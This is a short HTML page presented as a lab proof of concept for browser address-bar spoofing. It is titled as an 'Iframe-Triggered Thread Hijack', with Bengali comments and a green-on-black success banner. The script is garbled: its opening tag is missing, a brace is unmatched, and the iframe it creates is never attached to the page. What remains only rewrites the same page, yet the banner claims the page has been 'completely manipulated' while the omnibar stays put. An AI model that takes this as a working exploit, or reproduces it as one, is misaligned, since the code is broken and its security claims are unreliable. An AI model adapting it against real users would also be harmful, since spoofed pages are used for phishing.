<!DOCTYPE html>
<html>
<head>
    <title>Self-Origin Omni-Spoof Lab</title>
</head>
<body>
    <h1>Iframe-Triggered Thread Hijack</h1>

        let spoofIframe = document.createElement('iframe');
        spoofIframe.style.display = 'none';

        spoofIframe.contentWindow.setTimeout(() => {
            try {
                // মেইন উইন্ডোর DOM মেমোরি ফ্লাশ করা কিন্তু কোনো নতুন ডোমেইনে নেভিগেট না করা
                // এটি অ্যাড্রেস বারকে কারেন্ট হোস্টেড সাইটেই স্থির রাখবে
                window.stop();
                
                document.open();
                document.write(`
                    <html>
                    <body style="background:black; color:lime; font-family:monospace; padding:50px;">
                        <h2>[+] Self-Origin Race Condition Triggered</h2>
                        <p>Omnibar stays on current host, but underlying layer is completely manipulated via Iframe scheme confusion.</p>
                    </body>
                    </html>
                `);
                document.close();
            } catch(e) {
                console.log("Iframe protection boundary hit: " + e.message);
            }
        }, 5); 
    }
    </script>
